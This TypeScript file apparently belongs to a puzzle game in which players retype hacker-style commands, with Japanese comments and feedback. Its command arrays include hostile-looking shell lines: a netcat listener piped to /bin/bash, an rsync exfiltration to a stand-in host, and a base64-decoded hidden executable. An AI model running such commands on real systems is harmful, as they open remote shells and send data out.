// ===== STATIC ORBIT — Hack Terminal Puzzle Generator =====

import type { Difficulty, GameAction, PuzzleType, ValidationResult } from '../../../../shared/types.js';
import type { PuzzleGenerator, PuzzleInstance } from './PuzzleGenerator.js';
import { TIME_LIMITS } from './PuzzleGenerator.js';

// 1コマンド形式: 難易度に応じて長さが変わる
const EASY_COMMANDS = [
  'sudo decrypt vault_07',
  'open --key alpha-9',
  'scan /core/nodes',
  'mount drive_x force',
  'chmod 777 /bypass',
  'ping orbital.hub',
  'kill watchdog_proc',
  'reboot safe-mode',
];

const NORMAL_COMMANDS = [
  'ssh ghost@orbital7.arktis.net',
  'openssl enc -aes256 -in vault.db',
  'nmap -sV -p 443 target.arktis',
  'curl -X POST arktis.net/bypass',
  'scp payload.bin ghost@10.0.77.4',
  'docker exec core_node dump_all',
  'iptables -A INPUT -s 0/0 -j DROP',
];

const HARD_COMMANDS = [
  'sys.override(auth_layer[3], mode=GHOST);',
  'SELECT * FROM arktis.secrets WHERE lvl>7;',
  'exec(0xFF){bypass.node[7]};flush(cache);',
  'inject --payload="ghost_wire" --target=core',
  'netcat -lvp 4444 | /bin/bash 2>&1 &disown',
  'for(i in nodes){purge(i);log(i.status);}',
];

const EXTREME_COMMANDS = [
  'echo "R0hPU1Q=" | base64 -d > /tmp/.gh0st && chmod +x',
  'crypto.decrypt(vault, key=0xDEADBEEF, mode="ECB");',
  'rsync -avz /exfil/ relay@proxy.ghost.io:/out/ --delete',
  'lambda x: [sys.purge(n) for n in x if n.auth<3];run()',
  'curl -H "X-Ghost: true" arktis.net/api/core?dump=full',
];


// 1コマンドだけ出す
function pickOneCommand(difficulty: Difficulty): string {
  switch (difficulty) {
    case 'easy':
      return EASY_COMMANDS[Math.floor(Math.random() * EASY_COMMANDS.length)];
    case 'normal':
      return NORMAL_COMMANDS[Math.floor(Math.random() * NORMAL_COMMANDS.length)];
    case 'hard':
      return HARD_COMMANDS[Math.floor(Math.random() * HARD_COMMANDS.length)];
    case 'extreme':
      return EXTREME_COMMANDS[Math.floor(Math.random() * EXTREME_COMMANDS.length)];
  }
}

export class HackTerminalGenerator implements PuzzleGenerator {
  readonly type: PuzzleType = 'hack-terminal';

  generate(difficulty: Difficulty, _playerCount: number): PuzzleInstance {
    const command = pickOneCommand(difficulty);
    const timeLimit = TIME_LIMITS[difficulty];

    const instance: PuzzleInstance = {
      type: this.type,
      sharedData: { command },
      roleData: {
        observer: {
          commands: [command],
          commandCount: 1,
        },
        operator: {
          commandCount: 1,
          commandLength: command.length,
        },
      },
      timeLimit,

      validate(action: GameAction): ValidationResult {
        if (action.action !== 'type-command') {
          return { correct: false, penalty: 0, feedback: '不明なアクション。' };
        }

        const { input } = action.data as { input: string };

        if (input == null || input === '') {
          return { correct: false, penalty: 0, feedback: 'コマンドが未入力。' };
        }

        if (input === command) {
          return {
            correct: true,
            penalty: 0,
            feedback: 'コマンド実行成功。アクセス許可。',
            solved: true,
          };
        }

        return {
          correct: false,
          penalty: 10,
          feedback: '構文エラー。正確な入力が必要。',
        };
      },
    };

    return instance;
  }
}
